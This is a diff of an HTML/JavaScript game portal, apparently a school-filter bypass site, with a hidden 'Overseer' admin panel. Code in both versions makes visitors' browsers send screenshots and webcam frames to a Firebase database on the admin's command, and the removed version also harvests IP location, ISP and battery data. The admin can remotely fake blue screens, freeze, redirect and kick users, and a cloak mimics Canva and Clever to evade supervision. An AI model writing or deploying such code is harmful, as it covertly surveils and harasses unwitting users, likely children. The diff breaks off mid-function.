@@ -1,470 +1,575 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>404 Not Found</title>
-    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-    <style>
-        :root { --primary: #00ff41; --bg: #000; --card: #111; --accent: #003b00; --fav: #ff4757; --warn: #ffae00; --err: #ff0000; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #000; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
-        
-        #ghostAdmin { position: fixed; top: 0; left: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
-        #ghostPleb { position: fixed; top: 0; right: 0; width: 80px; height: 80px; z-index: 2000000; cursor: default; }
+  <meta charset="utf-8" />
+  <title>MONGLE — Admin</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+  <style>
+    :root{
+      --bg:#000;
+      --surface:#0b0b0b;
+      --muted:#888;
+      --accent:#00ff41;
+      --danger:#ff4141;
+      --warn:#ffae00;
+      --card:#111;
+      --radius:10px;
+      --mono: "Consolas", monospace;
+      --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      --max-w:1200px;
+    }
 
-        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 1000000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        #loginOverlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 1500000; display: none; align-items: center; justify-content: center; }
-        
-        #freeze { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 9999999; display: none; cursor: wait; color: var(--primary); font-family: monospace; flex-direction:column; align-items: center; justify-content: center; font-size: 20px; }
-        #bsod { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; font-family:'Segoe UI', sans-serif; z-index:99999999; padding:100px; font-size:24px; cursor:none; }
+    /* Cloak themes */
+    body[data-cloak="canva"] {
+      --bg: #eff6ff;
+      --surface: #ffffff;
+      --muted: #334155;
+      --accent: #06b6d4; /* teal-ish */
+      --card: #ffffff;
+      font-family: "Poppins", system-ui, -apple-system, sans-serif;
+      color: #0f172a;
+      background: linear-gradient(180deg,#f8fafc,#eff6ff);
+    }
+    body[data-cloak="clever"] {
+      --bg: #f4f8ff;
+      --surface: #ffffff;
+      --muted: #334e68;
+      --accent: #2563eb; /* blue */
+      --card: #ffffff;
+      font-family: "Inter", system-ui, -apple-system, sans-serif;
+      color: #0b1220;
+      background: linear-gradient(180deg,#fbfdff,#f4f8ff);
+    }
 
-        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; }
-        .nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: #080808; border-bottom: 1px solid #222; }
-        
-        .game-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 15px; padding: 20px; overflow-y: auto; flex-grow: 1; }
-        
-        .card { background: var(--card); border: 1px solid #222; padding: 40px 15px; text-align: center; cursor: pointer; border-radius: 8px; color: var(--primary); position: relative; transition: 0.2s; }
-        .card:hover { border-color: var(--primary); background: #0a1a0a; transform: scale(1.02); }
-        
-        .fav-area { position: absolute; top: 5px; right: 5px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; z-index: 100; cursor: pointer; background: #1a1a1a; border-radius: 50%; border: 1px solid #333; transition: 0.2s; }
-        .fav-area:hover { background: #333; border-color: var(--fav); }
-        .fav-btn { color: #555; font-size: 22px; pointer-events: none; transition: 0.2s; }
-        .fav-btn.active { color: var(--fav); text-shadow: 0 0 10px var(--fav); }
+    /* base */
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0}
+    body{
+      background:var(--bg);
+      color:var(--accent);
+      font-family:var(--mono);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      display:flex;
+      justify-content:center;
+      padding:18px;
+    }
 
-        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #0a0a0a; border: 1px solid #333; padding: 25px; z-index: 3000000; width: 95%; max-width: 1200px; border-radius: 12px; box-shadow: 0 0 60px #000; color: #fff; }
-        .input { background: #000; border: 1px solid #444; color: var(--primary); padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; border-radius: 6px; font-family: monospace; }
-        .btn { background: var(--primary); color: #000; border: none; padding: 10px 15px; cursor: pointer; font-weight: bold; border-radius: 4px; text-transform: uppercase; font-size: 11px; transition: 0.2s; font-family: monospace; }
-        .btn:hover { opacity: 0.8; }
-        .btn-red { background: var(--err); color: #fff; }
-        .btn-warn { background: var(--warn); color: #000; }
-        
-        .admin-layout { display: flex; gap: 20px; height: 600px; }
-        .u-sidebar { width: 300px; border: 1px solid #333; overflow-y: auto; background: #050505; }
-        .u-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; color: #888; transition: 0.2s; }
-        .u-item:hover { background: #111; color: #fff; }
-        .u-item.selected { border-left: 4px solid var(--primary); background: #0a1a0a; color: var(--primary); }
-        
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px; background: #000; padding: 15px; border: 1px solid #333; color: #ccc; overflow-y: auto; max-height: 150px; }
-        .info-grid b { color: var(--primary); }
-        .info-grid span { color: #fff; }
+    .wrap{
+      width:100%;
+      max-width:var(--max-w);
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+    }
 
-        #preview { height: 350px; border: 1px solid #333; background: #000 no-repeat center; background-size: contain; position: relative; }
-        #live-indicator { position: absolute; top: 10px; right: 10px; background: red; color: white; padding: 5px 10px; border-radius: 4px; font-size: 10px; display: none; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+    header{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
 
-        .switch { display: flex; align-items: center; gap: 10px; cursor: pointer; margin-bottom: 10px; }
-        .check-box { width: 20px; height: 20px; border: 1px solid #444; display: flex; align-items: center; justify-content: center; color: var(--primary); }
-    </style>
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo{
+      width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#7c3aed);display:inline-block
+    }
+    h1{margin:0;font-size:1.05rem;color:var(--accent);font-family:var(--sans)}
+
+    /* top controls */
+    .top-controls{display:flex;gap:8px;align-items:center}
+    .btn{
+      background:var(--surface);
+      color:var(--accent);
+      border:1px solid rgba(255,255,255,0.03);
+      padding:8px 10px;border-radius:8px;
+      cursor:pointer;font-weight:700;font-size:12px;
+    }
+    .btn.secondary{background:transparent;color:var(--muted);border:1px solid transparent}
+    .btn.danger{background:var(--danger);color:#fff}
+
+    main{display:flex;gap:16px}
+    /* left: games */
+    .col-left{flex:1;display:flex;flex-direction:column;gap:12px}
+    .searchbar{display:flex;gap:8px;align-items:center}
+    .input{padding:8px;border-radius:8px;background:#000;border:1px solid #222;color:var(--accent);font-family:var(--mono)}
+    .game-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;max-height:64vh;overflow:auto;padding:6px}
+    .card{background:var(--card);border-radius:8px;padding:18px;text-align:center;cursor:pointer;border:1px solid rgba(255,255,255,0.03);color:var(--accent);font-weight:700}
+    .card .fav{position:absolute;right:8px;top:8px;font-size:14px;color:#777}
+
+    /* right: admin */
+    .col-right{width:420px;min-width:320px;display:flex;flex-direction:column;gap:12px}
+    .panel{background:var(--surface);border-radius:12px;padding:12px;border:1px solid rgba(255,255,255,0.03)}
+    .user-list{max-height:36vh;overflow:auto;border-radius:8px;border:1px solid #111}
+    .u-item{padding:10px 12px;border-bottom:1px solid #0b0b0b;display:flex;justify-content:space-between;align-items:center;gap:8px}
+    .u-item.selected{background:linear-gradient(90deg,rgba(0,0,0,0.24),transparent);border-left:4px solid var(--accent)}
+    .u-meta{font-size:12px;color:var(--muted);font-family:var(--sans);font-weight:600}
+    .dossier{font-size:13px;color:var(--muted);line-height:1.35;min-height:120px}
+
+    .controls-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
+    .controls-grid .btn{padding:10px;border-radius:8px;text-transform:none;font-size:13px}
+
+    .controls-row{display:flex;gap:8px}
+    .small{font-size:12px;padding:6px 8px}
+
+    footer{color:var(--muted);font-size:12px;text-align:center;margin-top:6px}
+
+    /* preview */
+    #preview{height:220px;border-radius:8px;background:#000 center no-repeat;background-size:contain;border:1px solid #111}
+
+    /* responsive */
+    @media (max-width:980px){
+      .col-right{width:100%}
+      main{flex-direction:column}
+    }
+  </style>
 </head>
-<body>
-
-    <div id="ghostAdmin" onclick="door('admin')"></div>
-    <div id="ghostPleb" onclick="door('pleb')"></div>
-
-    <div id="lockdown"><h1>404</h1><p>The requested URL was not found on this server.</p></div>
-    <div id="freeze"><h1>SYSTEM PAUSED</h1><p>Contact Administrator</p></div>
-    <div id="bsod">:(<br><br>Your PC ran into a problem and needs to restart.<br><br><span style="font-size:18px">Stop Code: CRITICAL_PROCESS_DIED</span></div>
-
-    <div id="loginOverlay">
-        <div style="text-align:center; width: 320px; background:#0a0a0a; padding:40px; border-radius:15px; border:1px solid #333;">
-            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v4.0</h2>
-            <input type="text" id="username" class="input" placeholder="Identify Yourself...">
-            <button class="btn" style="width:100%" onclick="initSession()">CONNECT</button>
+<body data-cloak="default">
+  <div class="wrap" role="document">
+    <header>
+      <div class="brand">
+        <span class="logo" aria-hidden="true"></span>
+        <div>
+          <h1>MONGLE ADMIN</h1>
+          <div style="font-size:11px;color:var(--muted)">Presence & Overseer</div>
         </div>
-    </div>
+      </div>
 
-    <div id="app">
-        <div class="nav">
-            <div style="min-width: 150px;"><b>MONGLE_OS</b> <span id="badge" style="font-size:10px; color:var(--primary);"></span></div>
-            <div style="display:flex; gap:10px; flex-grow:1; justify-content: center; max-width:800px;">
-                <select id="cat" class="input" style="width:140px; margin:0;" onchange="renderGrid()">
-                    <option value="all">ALL_FILES</option>
-                    <option value="favs">FAVORITES ❤️</option>
-                    <option value="fnaf">FNAF (Only)</option>
-                    <option value="horror">SCARY / HORROR</option>
-                    <option value="action">ACTION / FPS</option>
-                    <option value="other">OTHER</option>
-                </select>
-                <input type="text" id="search" class="input" style="margin:0; max-width: 300px;" placeholder="Search Database..." oninput="renderGrid()">
-            </div>
-            <div style="display:flex; gap:8px; min-width: 150px; justify-content: flex-end;">
-                <!-- NEW: open Mongle in about:blank button -->
-                <button class="btn" style="background:#111; color:var(--primary); border:1px solid #222;" onclick="openMongleAboutBlank()">OPEN MONGLE (about:blank)</button>
+      <div class="top-controls">
+        <button class="btn" onclick="openMongleAboutBlank()">OPEN MONGLE (about:blank)</button>
+        <button id="adminBtn" class="btn" style="display:none" onclick="toggleModal('adminM')">OVERSEER</button>
+        <button class="btn secondary" onclick="toggleModal('settingsM')">SETTINGS</button>
+        <button class="btn danger" onclick="panicTrigger()">PANIC</button>
+      </div>
+    </header>
 
-                <button id="adminBtn" class="btn" style="display:none; background: #222; color: var(--primary); border: 1px solid var(--primary);" onclick="toggleModal('adminM')">OVERSEER</button>
-                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('settingsM')">⚙️</button>
-                <button class="btn btn-red" onclick="panicTrigger()">PANIC</button>
-            </div>
+    <main>
+      <section class="col-left">
+        <div class="panel">
+          <div class="searchbar">
+            <select id="cat" class="input" onchange="renderGrid()" style="width:150px">
+              <option value="all">ALL_FILES</option>
+              <option value="favs">FAVORITES</option>
+            </select>
+            <input id="search" class="input" placeholder="Search..." oninput="renderGrid()" style="flex:1">
+            <button class="btn small" onclick="renderGrid()">REFRESH</button>
+          </div>
         </div>
-        <div id="grid" class="game-grid"></div>
-    </div>
 
-    <div id="adminM" class="modal" aria-hidden="true">
-        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:15px;">
-            <h3 style="margin:0; color:var(--primary);">OVERSEER_CONTROL_DECK</h3>
-            <div>
-                <button class="btn btn-warn" onclick="globalReload()">NUKE (RELOAD ALL)</button>
-                <button class="btn" style="background:#222; color:#fff;" onclick="toggleModal('adminM')">CLOSE</button>
-            </div>
+        <div class="panel game-grid" id="grid" aria-live="polite"></div>
+      </section>
+
+      <aside class="col-right">
+        <div class="panel">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <div style="font-weight:700">USERS</div>
+            <div style="font-size:12px;color:var(--muted)"><span id="userCount">0</span> online</div>
+          </div>
+          <div id="userList" class="user-list" role="list"></div>
         </div>
-        <div class="admin-layout">
-            <div id="userList" class="u-sidebar"></div>
-            <div class="d-content">
-                <div id="dossier" class="info-grid">Select a user to view intel...</div>
-                <div id="preview"><div id="live-indicator">● LIVE FEED</div></div>
 
-                <div style="display:grid; grid-template-columns: repeat(5, 1fr); gap:8px; margin-top:8px;">
-                    <button class="btn" onclick="adminAct('capReq')">📸 SCREEN</button>
-                    <button class="btn" onclick="adminAct('camReq')">🎥 CAMERA</button>
-                    <button class="btn" onclick="adminAct('gpsReq')">📍 GET GPS</button>
-                    <button class="btn" id="watchBtn" style="background:#004400; color:white;" onclick="toggleWatch()">👁️ WATCH</button>
-                    <button class="btn" style="background:purple; color:white;" onclick="adminAct('reload')">↻ RELOAD</button>
+        <div class="panel">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+            <div style="font-weight:700">SELECTED</div>
+            <div style="font-size:12px;color:var(--muted)"><span id="selId">—</span></div>
+          </div>
 
-                    <button class="btn btn-warn" onclick="adminAct('frozen')">❄️ FREEZE</button>
-                    <button class="btn btn-warn" onclick="adminAct('bsod')">☠️ BSOD</button>
-                    <button class="btn btn-warn" onclick="adminAct('print')">🖨️ PRINT</button>
-                    <button class="btn btn-warn" onclick="adminAct('vibrate')">📳 VIBE</button>
-                    <button class="btn btn-red" onclick="adminAct('kicked')">🚫 KICK</button>
-                </div>
+          <div id="dossier" class="dossier">Select a user to view intel...</div>
 
-                <div style="display:flex; gap:8px; margin-top: 8px;">
-                    <input type="text" id="adminCommandInp" class="input" style="margin:0;" placeholder="Message / URL / Speak Text...">
-                    <button class="btn" onclick="adminCustom('msg')">MSG</button>
-                    <button class="btn" onclick="adminCustom('speak')">🗣️ SPEAK</button>
-                    <button class="btn" onclick="adminCustom('redir')">REDIR</button>
-                    <button class="btn" onclick="adminCustom('openTab')">TAB</button>
-                </div>
-            </div>
+          <div id="preview" aria-hidden="true"></div>
         </div>
-    </div>
 
-    <div id="settingsM" class="modal" style="width:340px;">
-        <h3>CONFIG</h3>
-        <div class="switch" onclick="toggleCfg('enable')">
-            <div class="check-box" id="chkEnable">✓</div>
-            <span>ENABLE PANIC KEY</span>
+        <div class="panel">
+          <div style="font-weight:700;margin-bottom:8px">ACTIONS</div>
+
+          <!-- Neater grouped controls -->
+          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Quick actions</div>
+          <div class="controls-grid" id="primaryActions">
+            <button class="btn" onclick="adminAct('capReq')">📸 Snapshot</button>
+            <button class="btn" onclick="adminAct('camReq')">🎥 Camera</button>
+            <button class="btn" onclick="adminAct('gpsReq')">📍 GPS</button>
+            <button class="btn" id="watchBtn" style="background:#004400;color:#fff" onclick="toggleWatch()">👁️ Watch</button>
+          </div>
+
+          <div style="height:10px"></div>
+
+          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Moderation</div>
+          <div class="controls-grid">
+            <button class="btn" onclick="adminAct('reload')">↻ Reload</button>
+            <button class="btn btn-warn" onclick="adminAct('frozen')">❄ Freeze</button>
+            <button class="btn btn-warn" onclick="adminAct('bsod')">☠ BSOD</button>
+            <button class="btn btn-warn" onclick="adminAct('vibrate')">📳 Vibrate</button>
+          </div>
+
+          <div style="height:10px"></div>
+
+          <div style="margin-bottom:8px;font-size:12px;color:var(--muted)">User controls</div>
+          <div class="controls-grid">
+            <button class="btn danger" onclick="adminAct('kicked')">🚫 Kick</button>
+            <button class="btn" onclick="adminRemoveUser()">🗑 Remove</button>
+            <button class="btn" onclick="adminSoftBan()">⛔ SoftBan</button>
+            <button class="btn" onclick="adminToggleMute()">🔇 Toggle Mute</button>
+          </div>
+
+          <div style="height:10px"></div>
+
+          <div style="display:flex;gap:8px;margin-top:10px">
+            <input id="adminCommandInp" class="input" placeholder="Message / URL / Game name" style="flex:1">
+            <button class="btn" onclick="adminMessage()">MSG</button>
+          </div>
+
+          <div style="display:flex;gap:8px;margin-top:8px">
+            <button class="btn secondary" onclick="adminOpenGame()">🕹 Open Game</button>
+            <button class="btn secondary" onclick="adminEmbedGame()">📡 Embed</button>
+            <button class="btn secondary" onclick="adminCopyIP()">📋 Copy IP</button>
+          </div>
+
         </div>
-        <label style="font-size:12px; color:#888;">PANIC URL</label>
-        <input type="text" id="cfgUrl" class="input" placeholder="https://google.com">
-        <label style="font-size:12px; color:#888;">PANIC KEY (Click & Press)</label>
-        <input type="text" id="cfgKeyDisp" class="input" placeholder="Press any key..." readonly style="cursor:pointer; text-align:center; border-color:var(--primary);">
-        <label style="font-size:12px; color:#888;">STEALTH MODE</label>
-        <select id="cfgMode" class="input">
-            <option value="tab">New Tab (Standard)</option>
-            <option value="blank">About:Blank (Full Stealth)</option>
-            <option value="embed">Embed in Mongle Tab</option>
-        </select>
-        <button class="btn" style="width:100%" onclick="saveConfig()">SAVE SETTINGS</button>
+      </aside>
+    </main>
+
+    <footer>Made with care — admin UI (improved). Cloak mode available in Settings.</footer>
+  </div>
+
+  <!-- Settings modal -->
+  <div id="settingsM" class="modal" style="display:none;position:fixed;inset:0;align-items:center;justify-content:center;z-index:200">
+    <div style="width:360px;background:var(--surface);padding:16px;border-radius:12px;border:1px solid rgba(0,0,0,0.4)">
+      <h3 style="margin:0 0 8px 0;color:var(--accent)">SETTINGS</h3>
+
+      <label style="font-size:12px;color:var(--muted)">Panic URL</label>
+      <input id="cfgUrl" class="input" style="width:100%" placeholder="https://google.com">
+
+      <label style="font-size:12px;color:var(--muted)">Panic Key</label>
+      <input id="cfgKeyDisp" class="input" readonly style="cursor:pointer">
+
+      <label style="font-size:12px;color:var(--muted)">Cloak Appearance</label>
+      <select id="cfgCloak" class="input" style="width:100%">
+        <option value="default">Default</option>
+        <option value="canva">Cloak: Canva-like</option>
+        <option value="clever">Cloak: Clever-like</option>
+      </select>
+
+      <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end">
+        <button class="btn secondary" onclick="toggleModal('settingsM')">CANCEL</button>
+        <button class="btn" onclick="saveSettings()">SAVE</button>
+      </div>
     </div>
+  </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, onValue, set, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+  <!-- embedded container (used when user chooses embed) -->
+  <div id="embeddedContainer" style="display:none;position:fixed;inset:44px 10px 10px 10px;z-index:150;align-items:center;justify-content:center">
+    <button style="position:absolute;right:18px;top:8px;padding:8px;border-radius:6px;background:#111;color:var(--accent);border:1px solid #222" onclick="closeEmbedded()">CLOSE</button>
+    <iframe id="embeddedFrame" style="width:calc(100% - 40px);height:calc(100% - 40px);border-radius:8px;border:2px solid #111;background:#000"></iframe>
+  </div>
 
-        // Firebase credentials for Overseer functions
-        const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getDatabase, ref, onValue, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        let userRef, myID, selectedID, isAdmin = false, gameData = [];
-        let favs = JSON.parse(localStorage.getItem('favs') || '[]');
-        let cfg = { url: localStorage.getItem('pUrl') || 'https://google.com', key: localStorage.getItem('pKey') || 'Escape', mode: localStorage.getItem('pMode') || 'tab', enable: localStorage.getItem('pEnable') !== 'false' };
-        let activeGameWindow = null, watchInterval = null, tempKey = cfg.key;
-        let presenceSnapshot = {};
-        
-        const keyDisp = document.getElementById('cfgKeyDisp');
-        keyDisp.onclick = () => {
-            keyDisp.value = "[ PRESS KEY NOW ]"; keyDisp.style.background = "#222";
-            const handler = (e) => { e.preventDefault(); tempKey = e.key; keyDisp.value = e.key.toUpperCase(); keyDisp.style.background = "#000"; window.removeEventListener('keydown', handler); };
-            window.addEventListener('keydown', handler);
+    const firebaseConfig = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    let userRef, myID, selectedID = null, isAdmin = false;
+    let presenceSnapshot = {};
+    let gameData = [];
+    let favs = JSON.parse(localStorage.getItem('favs')||'[]');
+    let watchInterval = null;
+    let tempKey = localStorage.getItem('pKey') || 'Escape';
+    let cfg = {
+      url: localStorage.getItem('pUrl') || 'https://google.com',
+      key: tempKey,
+      cloak: localStorage.getItem('pCloak') || 'default',
+      mode: localStorage.getItem('pMode') || 'tab',
+      enable: localStorage.getItem('pEnable') !== 'false'
+    };
+
+    // Initialize UI values
+    document.getElementById('cfgUrl').value = cfg.url;
+    document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
+    document.getElementById('cfgCloak').value = cfg.cloak;
+    applyCloak(cfg.cloak);
+
+    // helper: escape
+    function escapeHtml(s){ if(typeof s !== 'string') return s; return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+    // Open Mongle in about:blank with iframe of this page
+    window.openMongleAboutBlank = () => {
+      const newWin = window.open('about:blank');
+      if(!newWin){ alert('Popup blocked. Allow popups.'); return; }
+      const base = location.href;
+      const html = `<!doctype html><html><head><meta charset="utf-8"><title>MONGLE</title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:${getComputedStyle(document.body).background};"><iframe src="${base}" style="border:none;width:100vw;height:100vh"></iframe></body></html>`;
+      newWin.document.open(); newWin.document.write(html); newWin.document.close();
+    };
+
+    // init session (client)
+    window.initSession = async () => {
+      const name = (document.getElementById('username').value || `User_${Math.floor(Math.random()*9999)}`).trim();
+      document.querySelector('.wrap').style.opacity = '1';
+      document.getElementById('loginOverlay').style.display = 'none';
+
+      userRef = push(ref(db, 'presence'), {
+        name: name, activity: 'Browsing Menu', joined: new Date().toISOString(),
+        res: `${screen.width}x${screen.height}`,
+        hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
+        bat: '?', plat: navigator.platform, ip: 'Hidden', loc: '?', isp: '?',
+        gps: 'Pending...', reload:false
+      });
+      myID = userRef.key;
+      onDisconnect(userRef).remove();
+
+      // watch our own node for admin commands (embedding etc.)
+      onValue(ref(db, `presence/${myID}`), (s) => {
+        const d = s.val()||{};
+        if(d.kicked){ closeActive(); window.location.replace(cfg.url); }
+        if(d.openEmbedUrl){ try{ showEmbedded(d.openEmbedUrl); }finally{ update(userRef, {openEmbedUrl:null}).catch(()=>{}); } }
+        if(d.capReq){ html2canvas(document.body,{useCORS:true}).then(c=>update(userRef,{lastCap:c.toDataURL('image/webp',0.2),capReq:false})).catch(()=>update(userRef,{capReq:false})); }
+        if(d.camReq){ navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{ const v=document.createElement('video'); v.srcObject=stream; v.play(); v.onloadedmetadata=()=>{ const c=document.createElement('canvas'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); stream.getTracks().forEach(t=>t.stop()); update(userRef,{lastCap:c.toDataURL('image/webp',0.5),camReq:false}); }; }).catch(()=>update(userRef,{camReq:false})); }
+      });
+
+      // fetch games list (defensive)
+      try {
+        const res = await fetch('https://api.github.com/repos/sqsqs353-alt/the-mongle-thing/contents/');
+        const data = await res.json();
+        gameData = Array.isArray(data) ? data.filter(f=>f.name && f.name.endsWith('.html') && f.name!=='index.html') : [];
+      } catch(e){ console.warn('game list fetch failed',e); gameData = []; }
+      renderGrid();
+
+      // if admin, start overseer
+      if(isAdmin) startOverseer();
+    };
+
+    // render games
+    function renderGrid(){
+      const q = (document.getElementById('search').value||'').toLowerCase();
+      const cat = document.getElementById('cat').value;
+      const grid = document.getElementById('grid'); grid.innerHTML='';
+      const sorted = [...gameData];
+      sorted.filter(g => {
+        const n = (g.name||'').toLowerCase();
+        if(!n.includes(q)) return false;
+        if(cat==='favs') return favs.includes(g.name);
+        return true;
+      }).forEach(g=>{
+        const safeName = g.name||'unknown.html';
+        const el = document.createElement('div'); el.className='card';
+        el.innerHTML = `<div style="position:relative">${escapeHtml(safeName.replace('.html','').toUpperCase())}</div>`;
+        el.onclick = () => {
+          const url = `https://raw.githack.com/sqsqs353-alt/the-mongle-thing/main/${safeName}`;
+          if(cfg.mode==='embed'){ showEmbedded(url); update(userRef,{activity:'Playing '+safeName}); }
+          else if(cfg.mode==='blank'){ const w = window.open('about:blank'); w.document.body.innerHTML=`<iframe src="${url}" style="border:0;width:100vw;height:100vh"></iframe>`; update(userRef,{activity:'Playing '+safeName}); }
+          else { window.open(url,'_blank'); update(userRef,{activity:'Playing '+safeName}); }
         };
+        grid.appendChild(el);
+      });
+    }
 
-        // Opens a new about:blank and embeds the Mongle app (this page) inside an iframe there.
-        window.openMongleAboutBlank = () => {
-            try {
-                const newWin = window.open('about:blank');
-                if (!newWin) { alert('Popup blocked — allow popups for this site.'); return; }
-                const baseUrl = location.href;
-                const html = `<!doctype html><html><head><meta charset="utf-8"><title>MONGLE (about:blank)</title><meta name="viewport" content="width=device-width,initial-scale=1"/></head><body style="margin:0;background:#000;"><iframe src="${baseUrl}" style="border:none;width:100vw;height:100vh;" allow="fullscreen"></iframe></body></html>`;
-                newWin.document.open();
-                newWin.document.write(html);
-                newWin.document.close();
-            } catch (err) {
-                console.error("openMongleAboutBlank failed:", err);
-                alert('Failed to open about:blank. See console for details.');
-            }
-        };
+    // Embedded helpers (client)
+    function showEmbedded(url){
+      const container = document.getElementById('embeddedContainer');
+      const frame = document.getElementById('embeddedFrame');
+      if(!container || !frame) return;
+      frame.src = url;
+      container.style.display='flex';
+    }
+    function closeEmbedded(){ const c=document.getElementById('embeddedContainer'); if(!c) return; document.getElementById('embeddedFrame').src='about:blank'; c.style.display='none'; }
 
-        window.door = (type) => {
-            if(type === 'admin') {
-                if(prompt("AUTH_CODE:") === "BALLS_ARE_GOOD") { isAdmin = true; document.getElementById('adminBtn').style.display="block"; document.getElementById('badge').innerText="[OVERSEER]"; initSession(); }
-            } else { document.getElementById('loginOverlay').style.display = 'flex'; }
-        };
+    function closeActive(){ /* placeholder to close active windows if needed */ }
 
-        window.initSession = async () => {
-            const name = document.getElementById('username').value || "User_" + Math.floor(Math.random()*999);
-            document.getElementById('lockdown').style.display="none"; 
-            document.getElementById('loginOverlay').style.display="none"; 
-            document.getElementById('app').style.display="flex";
+    /* --- ADMIN / Overseer --- */
 
-            let ipInfo = { ip: 'Hidden', city: '?', region: '?', org: '?' };
-            try { const r = await fetch('https://ipapi.co/json/'); if(r.ok) ipInfo = await r.json(); } catch(e) {}
-            const bat = await navigator.getBattery?.().catch(()=>({}));
-            
-            userRef = push(ref(db, 'presence'), {
-                name: name, activity: 'Browsing Menu', joined: new Date().toISOString(),
-                res: `${screen.width}x${screen.height}`, 
-                hw: `${navigator.hardwareConcurrency||'?'}C / ${navigator.deviceMemory||'?'}GB`,
-                bat: bat?.level ? `${Math.round(bat.level*100)}%` : '?',
-                plat: navigator.platform, ip: ipInfo.ip, loc: `${ipInfo.city}, ${ipInfo.region}`, isp: ipInfo.org,
-                gps: 'Pending Permission...', reload: false
-            });
-            myID = userRef.key;
-            onDisconnect(userRef).remove();
+    function startOverseer(){
+      onValue(ref(db,'presence'), (snap) => {
+        presenceSnapshot = {};
+        const list = document.getElementById('userList'); list.innerHTML = '';
+        let count = 0;
+        snap.forEach(c=>{
+          const val = c.val() || {};
+          // Skip presence entries that are kicked or have no name (user asked to remove "🚫 Unknown")
+          if(val.kicked || !val.name) return;
+          presenceSnapshot[c.key] = val;
+          count++;
+          const displayName = val.name || `User_${c.key.substring(0,6)}`;
+          const activity = val.activity || '—';
+          const li = document.createElement('div');
+          li.className = 'u-item' + (selectedID===c.key ? ' selected' : '');
+          li.innerHTML = `<div style="min-width:0"><div style="font-weight:700;color:var(--accent)">${escapeHtml(displayName)}</div><div class="u-meta">${escapeHtml(activity)}</div></div><div style="font-size:12px;color:var(--muted)">${escapeHtml(val.res || '')}</div>`;
+          li.onclick = () => { selectedID = c.key; updateDossier(val, c.key); startOverseer(); };
+          list.appendChild(li);
+        });
+        document.getElementById('userCount').innerText = count;
+        // if previously selected removed, clear
+        if(selectedID && !snap.hasChild(selectedID)){ selectedID=null; document.getElementById('dossier').innerText='Select a user to view intel...'; document.getElementById('preview').style.backgroundImage=''; if(watchInterval){ clearInterval(watchInterval); watchInterval=null; document.getElementById('watchBtn').style.background='#004400'; document.getElementById('watchBtn').innerText='👁️ Watch'; } }
+      }, (err)=>console.error('presence read error',err));
+    }
 
-            // Watch our own presence node for admin commands directed at this client
-            onValue(ref(db, `presence/${myID}`), (s) => {
